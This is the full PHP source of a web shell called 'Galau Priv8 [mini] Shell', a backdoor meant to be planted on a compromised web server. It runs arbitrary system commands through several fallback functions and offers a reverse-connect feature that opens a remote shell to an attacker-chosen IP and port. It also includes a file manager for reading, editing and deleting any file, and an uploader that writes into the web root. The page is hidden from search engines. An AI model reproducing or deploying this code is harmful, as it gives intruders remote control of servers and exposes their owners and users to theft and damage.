<?php
/*
Galau Priv [mini] Shell
*/
@set_time_limit(0);
@error_reporting(0);
@error_log(0);

if(isset($_GET['kupo'])){
	$kupo = $_GET['kupo'];
	@chdir($kupo);
}
else {
	$kupo = @getcwd();
}
$kupo = str_replace("\\", "/", $kupo);


function ex($x){
	$x=$x.' 2>&1';
	if(!is_null($backtic=`$x`))
	{
		return $backtic;
	}
	elseif(function_exists('system'))
	{
		ob_start();
		$system=system($x);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);
		foreach($results as $result)
		{
			$buff.=$result;
		}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);
		return $buff;
	}
	elseif(function_exists('pcntl_exec'))
	{
		$buff=pcntl_exec($x);
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();
		ob_end_clean();	
		return $buff;
	}
	elseif(function_exists('proc_open'))
	{
		$proc=proc_open($x,array(
			array("pipe","r"),
			array("pipe","w"),
			array("pipe","w")
		),$pipes);
		$buff=stream_get_contents($pipes[1]);
		return $buff;
	}
	elseif(function_exists('popen'))
	{
		$buff="";
		$pop=popen($x,"r");
		while(!feof($pop))
		{
			$buff.=fread($pop,1024);
		}
		pclose($pop);
		return $buff;
	}
	return "Sad Life :)";
}

function wcek($r, $s){
	if(is_writable($r)){
		return "<font color=lime>$s</font>";
	}
	else {
		return "<font color=red>$s</font>";
	}
}

function rcek($r, $s){
	if(is_readable($r)){
		return "<font color=lime>$s</font>";
	}
	else {
		return "<font color=red>$s</font>";
	}
}

function perms($file) {
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
?>
<html>
<head>
<title>Galau Priv8 [mini] Shell</title>
<meta name="robots" content="noindex, nofollow">
<style>
body { background: #000; color: #00ff00; font-family: Agency FB; }
a { text-decoration: none; color: #dd0000; }
a:hover { text-decoration: none; color: #fff; }
input, select { border: 1px solid #fff; background: transparent; color: #fff; }
option { background: black; color: white; }
textarea { resize: none; background: transparent; color: #fff; border: 1px solid #fff; }
h1 {  
font-weight:14px;
 font-size:40px;
 background:transparent;
 color:#fff;
 text-shadow:
   0 0 3px #00ff00,
   0 0 5px #00ff00,
   0 0 9px #00ff00,
   0 0 20px #00ff00,
   0 0 25px #00ff00,
   0 0 30px #00ff00,
   0 0 50px #00ff00; 
}
#home { width: 800px; border-top: 1px solid #00ff00; border-bottom: 1px solid #00ff00; border-left: 1px solid #00ff00; border-right: 1px solid #00ff00; }
#home table, tr, td { border: 1px none #000; }
#filez { width: 800px; border-top: 1px solid #dd0000; border-bottom: 1px solid #dd0000; border-left: 1px solid #dd0000; border-right: 1px solid #dd0000; }
#filez table, tr, td { border: 1px none #000; color: #00ffcc; }
#filez a { text-decoration: none; color: #ffbf00; }
#filez a:hover { text-decoration: none; color: #fff; }
#filez pre { font: 9pt Courier New; }
#konek { width: 500px; border-top: 1px solid #00ccff; border-bottom: 1px solid #00ccff; border-left: 1px solid #00ccff; border-right: 1px solid #00ccff; }
#konek table, tr, td { border: 1px none #000 }
.gayakonek { background: #333; }
</style>
</head>
<body>
<h1 style="color: #fff;"><center>Galau Priv8 [mini] Shell</center></h1>
<center><a href="?">Home</a> | <a href="?moxan=dosya">File Manager</a> | <a href="?moxan=konek">Reverse Connect</a></center>
<?php
if(isset($_GET['moxan']) && $_GET['moxan'] == "konek"){
	echo "<center><div id=\"konek\"><table width=\"500\"><tr><td class=\"gayakonek\">Reverse Connect</td></tr>
	<table><form method=\"post\" onsubmit=\"return confirm('use nc -lvp '+document.getElementById('port_bc').value+'')\">
	<tr><td>Ip Address:</td><td><input type=\"text\" name=\"ip_bc\" value=\"".$_SERVER['REMOTE_ADDR']."\"></td></tr>
	<tr><td>Port:</td><td><input type=\"text\" name=\"port_bc\" id=\"port_bc\" value=\"1234\"></td></tr>
	<tr><td><input type=\"submit\" name=\"go_bc\" value=\">>\"></td></tr></table>
	</form>
	</table></div></center>";
	
	if(isset($_POST['go_bc'])){
		$host = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$fs = @fsockopen($host, $port, $errno, $errstr);
		if($errno != 0){
			die("<font color=\"red\"><b>$errno:</b>$errstr</font>");
		}
		else {
			while(!feof($fs)){
				fwrite($fs, "[m1n1shell]> ");
				$cmd = fgets($fs, 1024);
				if(trim($cmd) == "exit" || trim($cmd) == "quit"){
					fclose($fs);
					echo $cmd;
					exit;
				}
				fwrite($fs, ex($cmd));
			}
			fclose($fs);
		}
	}
}
elseif(isset($_GET['moxan']) && $_GET['moxan'] == "dosya"){
	if(isset($_GET['jokax']) && $_GET['jokax'] == "newfile"){
		if(isset($_POST['bikin'])){
			$fp = @fopen($_POST['namanya'], "a");
			if($fp){
				echo "<script>window.location='?kupo=".$kupo."';</script>";
			}
			else {
				echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=".$kupo."';</script>";
			}
		}
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">New File</td></tr>
		<tr><td><form method=\"post\">
		<input type=\"text\" name=\"namanya\" value=\"$kupo/new.php\" style=\"width: 450px;\">
		<input type=\"submit\" name=\"bikin\" value=\">>\">
		</form>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "newfolder"){
		if(isset($_POST['create'])){
			if(@mkdir($_POST['haku'], 0777)){
				echo "<script>window.location='?moxan=dosya&kupo$kupo';</script>";
			}
			else {
				echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo$kupo';</script>";
			}
		}
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">New Folder</td></tr>
		<tr><td><form method=\"post\">
		<input type=\"text\" name=\"haku\" style=\"width: 450px;\">
		<input type=\"submit\" name=\"create\" value=\">>\">
		</form>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "rename"){
		if(isset($_POST['ren'])){
			if(@rename($kupo, "".dirname($kupo)."/".htmlspecialchars($_POST['inikuh'])."")){
				echo "<script>window.location='?moxan=dosya&kupo$kupo';</script>";
			}
			else {
				echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo$kupo';</script>";
			}
		}
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">Rename Folder</td></tr>
		<form method=\"post\">
		<input type=\"text\" name=\"inikuh\" value=\"$kupo\" style=\"width: 450px;\">
		<input type=\"submit\" name=\"create\" value=\">>\">
		</form>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "del"){
		if(@rmdir($kupo)){
			echo "<script>window.location=?moxan=dosya&kupo'".dirname($kupo)."';</script>";
		}
		else {
			echo "<script>alert('Gagal Hapus Folder: ".basename($kupo)."');window.location=?moxan=dosya&kupo'$kupo';</script>";
		}
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "view"){
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">View File</td></tr>
		<tr><td><pre>".htmlspecialchars(file_get_contents($_GET['lupus']))."</pre>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "edit"){
		if(isset($_POST['save'])){
			$grux = @fopen($_GET['lupus'], "w");
			if(fwrite($grux, $_POST['isikun'])){
				echo "<script>alert('Berhasil');</script>";
			}
			else {
				echo "<script>alert('Gagal');</script>";
			}
		}
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">Edit File</td></tr>
		<tr><td><form method=\"post\">
		<textarea name=\"isikun\" style=\"width: 800px; height: 100px;\">".htmlspecialchars(file_get_contents($_GET['lupus']))."</textarea><br>
		<input type=\"submit\" name=\"save\" value=\">>\">
		</form>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "gantiname"){
		if(isset($_POST['proc'])){
			if(@rename($_GET['lupus'], "$kupo/".htmlspecialchars($_POST['baruko'])."")){
				echo "<script>alert('Berhasil');</script>";
			}
			else {
				echo "<script>alert('Gagal');</script>";
			}
		}
		echo "<center><div id=\"filez\"><table width=\"800\"><tr><td class=\"gayakonek\">Rename File</td></tr>
		<form method=\"post\">
		<tr><td>
		<input type=\"text\" name=\"baruko\" style=\"width: 450px;\" value=\"".basename($_GET['lupus'])."\">
		<input type=\"submit\" name=\"proc\" value=\">>\">
		</form>
		</td></tr></table></div></center>";
	}
	elseif(isset($_GET['jokax']) && $_GET['jokax'] == "rm"){
		if(@unlink($_GET['lupus'])){
			echo "<script>alert('Berhasil');window.location='?moxan=dosya&kupo=$kupo';</script>";
		}
		else {
			echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=$kupo';</script>";
		}
	}
	else {
		if(is_dir($kupo) === true){
			echo "<center><div id=\"filez\"><table width=\"800\">
			<tr>
			<th><center>Name</center></th>
			<th><center>Type</center></th>
			<th><center>Size</center></th>
			<th><center>Last Modified</center></th>
			<th><center>Owner:Group</center></th>
			<th><center>Permission</center></th>
			<th><center>Action</center></th>
			</tr>";
			
			$skensay = scandir($kupo);
			foreach($skensay as $popoji){
				$datatype = filetype($popoji);
				$datatime = date("F d Y g:i:s", filemtime($popoji));
				if(function_exists("posix_getpwuid")){
					$dataowner = posix_getpwuid(fileowner("$kupo/$popoji"));
					$dataowner = $dataowner['name'];
				}
				else {
					$dataowner = fileowner("$kupo/$popoji");
				}
				if(function_exists("posix_getgrgid")){
					$datagroup = posix_getgrgid(filegroup("$kupo/$popoji"));
					$datagroup = $datagroup['name'];
				}
				else {
					$datagroup = filegroup("$kupo/$popoji");
				}
				if(!is_dir("$kupo/$popoji")) continue;
				if($popoji === ".."){
					$kukis = "<a href=\"?moxan=dosya&kupo=".dirname($kupo)."\">$popoji</a>";
				}
				elseif($popoji === "."){
					$kukis = "<a style=\"color: green;\" href=\"?moxan=dosya&kupo=$kupo\">$popoji</a>";
				}
				else {
					$kukis = "<a style=\"color: green;\" href=\"?moxan=dosya&kupo=$kupo/$popoji\">$popoji</a>";
				}
				if($popoji === "." || $popoji === ".."){
					$juki = "<a href=\"?moxan=dosya&jokax=newfile&kupo=$kupo\">New File</a> | <a href=\"?moxan=dosya&jokax=newfolder&kupo=$kupo\">New Folder</a>";
				}
				else {
					$juki = "<a href=\"?moxan=dosya&jokax=rename&kupo=$kupo/$popoji\">Rename</a> | <a href=\"?moxan=dosya&jokax=del&kupo=$kupo/$popoji\">Delete</a>";
				}
				echo "<tr>";
				echo "<td>$kukis</td>";
				echo "<td><center>$datatype</center></td>";
				echo "<td><center>-</center></td>";
				echo "<td><center>$datatime</center></td>";
				echo "<td><center>$dataowner:$datagroup</center></td>";
				echo "<td><center>".wcek("$kupo/$popoji", perms("$kupo/$popoji"))."</center></td>";
				echo "<td style=\"padding-left: 15px;\">$juki</td>";
			}
			echo "</tr>";
			foreach($skensay as $mongo){
				$fatatype = filetype($mongo);
				$fatatime = date("F d Y g:i:s", filemtime($mongo));
				if(function_exists("posix_getpwuid")){
					$fataowner = posix_getpwuid(fileowner("$kupo/$mongo"));
					$fataowner = $fataowner['name'];
				}
				else {
					$fataowner = fileowner("$kupo/$mongo");
				}
				if(function_exists("posix_getgrgid")){
					$fatagroup = posix_getgrgid(filegroup("$kupo/$mongo"));
					$fatagroup = $fatagroup['name'];
				}
				else {
					$fatagroup = filegroup("$kupo/$mongo");
				}
				$fatasize = filesize("$kupo/$mongo")/1024;
				$fatasize = round($fatasize, 3);
				if($fatasize > 1024){
					$fatasize = round($fatasize/1024, 2) . "MB";
				}
				else {
					$fatasize = $fatasize . "KB";
				}
				if(!is_file("$kupo/$mongo")) continue;
				echo "<tr>";
				echo "<td><a style=\"color: red;\" href=\"?moxan=dosya&jokax=view&kupo=$kupo&lupus=$kupo/$mongo\">$mongo</a></td>";
				echo "<td><center>$fatatype</center></td>";
				echo "<td><center>$fatasize</center></td>";
				echo "<td><center>$fatatime</center></td>";
				echo "<td><center>$fataowner:$fatagroup</center></td>";
				echo "<td><center>".rcek("$kupo/$mongo", perms("$kupo/$mongo"))."</center></td>";
				echo "<td style=\"padding-left: 15px\">
				<a href=\"?moxan=dosya&jokax=edit&kupo=$kupo&lupus=$kupo/$mongo\">Edit</a> |
				<a href=\"?moxan=dosya&jokax=gantiname&kupo=$kupo&lupus=$kupo/$mongo\">Rename</a> |
				<a href=\"?moxan=dosya&jokax=rm&kupo=$kupo&lupus=$kupo/$mongo\">Delete</a></td>";
			}
			echo "</tr></table></div>";
		}
		else {
			echo "<font color=\"red\">Can't Scan This Directory</font>";
		}
	}
}
else {
	echo "<center><div id=\"home\"><table width=\"800\"><tr><td>
	<h1><center>[mini] Version by ./MyHeartIsyr</center></h1>
	<form enctype=\"multipart/form-data\" method=\"post\">
	<center><input type=\"radio\" name=\"tipe\" value=\"biasa\">Biasa
	<input type=\"radio\" name=\"tipe\" value=\"root\">public_html</center>
	<input type=\"file\" name=\"monkey\"><br>
	<input type=\"text\" name=\"yourpath\" value=\"".@getcwd()."\" style=\"width: 350px;\">
	<input type=\"submit\" name=\"aplud\" value=\">>\">
	</form>
	</td></tr></table>
	</div></center>";
	
	if(isset($_POST['aplud'])){
		switch($_POST['tipe']){
			case "biasa":
				if(@copy($_FILES['monkey']['tmp_name'], $_POST['yourpath']."/".$_FILES['monkey']['name'])){
					echo "<script>alert('Berhasil');</script>";
				}
				else {
					echo "<script>alert('Gagal');</script>";
				}
				break;
			case "root":
				$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['monkey']['name'];
				$web = $_SERVER['HTTP_HOST']."/".$_FILES['monkey']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])){
					if(@copy($_FILES['monkey']['tmp_name'], $root)){
						echo "<script>alert('Berhasil!');</script>";
					}
					else {
						echo "<script>alert('Gagal!');</script>";
					}
				}
				else {
					echo "<script>alert('Direktorinya gak writeable');</script>";
				}
				break;
			default: break;
		}
	}
}
?>
<center>Copyright &copy; <a href="https://myheart-isyr.blogspot.com/" target="_blank">./MyHeartIsyr</a></center>